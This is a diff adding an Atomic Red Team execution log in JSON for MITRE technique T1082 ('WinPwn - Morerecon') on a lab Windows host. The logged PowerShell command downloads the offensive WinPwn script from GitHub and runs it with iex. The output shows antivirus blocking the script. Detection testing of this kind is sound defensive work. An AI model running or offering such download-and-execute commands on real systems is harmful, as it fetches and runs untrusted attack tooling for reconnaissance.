@@ -1,0 +1,48 @@
+{
+    "attire-version":  "1.1",
+    "execution-data":  {
+                           "execution-source":  "Invoke-Atomicredteam",
+                           "execution-id":  "OTc5YWVhODgtYWQ4Ni00ZjhmLWE1MTQtNWIzNDUzMmMzNDNj",
+                           "execution-category":  {
+                                                      "name":  "Atomic Red Team",
+                                                      "abbreviation":  "ART"
+                                                  },
+                           "execution-command":  "Invoke-AtomicTest T1082 -TestGuids 3278b2f6-f733-4875-9ef4-bfed34244f0a -PathToAtomicsFolder C:\\AtomicRedTeam\\atomics -ExecutionLogPath C:\\AtomicRedTeam\\invoke-atomicredteam\\Logs\\T1082-3278b2f6-f733-4875-9ef4-bfed34244f0a.json -TimeoutSeconds 120 -LoggingModule Attire-ExecutionLogger",
+                           "target":  {
+                                          "user":  "redshirt\\edrba",
+                                          "host":  "RedShirt",
+                                          "ip":  "192.168.56.1",
+                                          "path":  "C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\edrba\\AppData\\Local\\Microsoft\\WindowsApps"
+                                      },
+                           "time-generated":  "2024-10-12T18:07:14.000Z"
+                       },
+    "procedures":  [
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - Morerecon",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "3278b2f6-f733-4875-9ef4-bfed34244f0a"
+                                            },
+                           "procedure-description":  "Gathers local system information using the Morerecon function of WinPwn",
+                           "order":  19,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:07:11.000Z",
+                                             "time-stop":  "2024-10-12T18:07:14.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t\niex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)\nMorerecon -noninteractive -consoleoutput",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ #  Global TLS Setting for all functions. If TLS12 isnt suppported yo ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:2 char:1\r\n+ iex(new-object net.webclient).downloadstring(https://raw.githubuserc ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\nMorerecon : The term Morerecon is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:3 char:1\r\n+ Morerecon -noninteractive -consoleoutput}\r\n+ ~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Morerecon:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       }
+                   ]
+}
+
